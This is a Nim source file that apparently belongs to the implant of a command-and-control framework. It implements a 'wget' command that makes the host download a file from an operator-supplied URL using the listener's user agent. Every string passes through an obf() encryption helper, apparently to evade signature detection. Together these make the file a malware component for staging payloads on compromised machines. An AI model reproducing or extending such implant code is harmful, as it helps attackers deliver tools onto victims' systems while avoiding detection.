#[
    Cross-Platform wget Command
    Download files from URLs
    Compatible with Linux, macOS, and other Unix-like systems
]#

import httpclient, strutils, os, uri
import ../../util/strenc
import ../../core/webClientListener

proc wget*(li: webClientListener.Listener, args: seq[string]): string =
    try:
        if args.len < 1 or args.len > 2:
            return obf("ERROR: wget requires one or two arguments.\nUsage: wget <URL> [local_filename]")
        
        let url = args[0]
        let filename = if args.len == 2: args[1] else: extractFilename(parseUri(url).path)
        
        if filename == "":
            return obf("ERROR: Could not determine filename. Please specify a local filename.")
        
        when defined verbose:
            echo obf("DEBUG: wget downloading: ") & url & obf(" -> ") & filename
        
        var client = newHttpClient()
        client.headers = newHttpHeaders()
        client.headers["User-Agent"] = li.userAgent
        client.headers["Accept"] = "*/*"
        
        let response = client.get(url)
        
        if not response.status.startsWith("200"):
            client.close()
            return obf("ERROR: HTTP request failed with status: ") & response.status
        
        # Write file to disk
        writeFile(filename, response.body)
        
        client.close()
        
        when defined verbose:
            echo obf("DEBUG: wget completed, file size: ") & $response.body.len & obf(" bytes")
        
        return obf("File downloaded successfully:\n") &
               obf("URL: ") & url & "\n" &
               obf("File: ") & filename & "\n" &
               obf("Size: ") & $response.body.len & obf(" bytes")
        
    except Exception as e:
        when defined verbose:
            echo obf("DEBUG: wget failed: ") & e.msg
        return obf("ERROR: Download failed - ") & e.msg 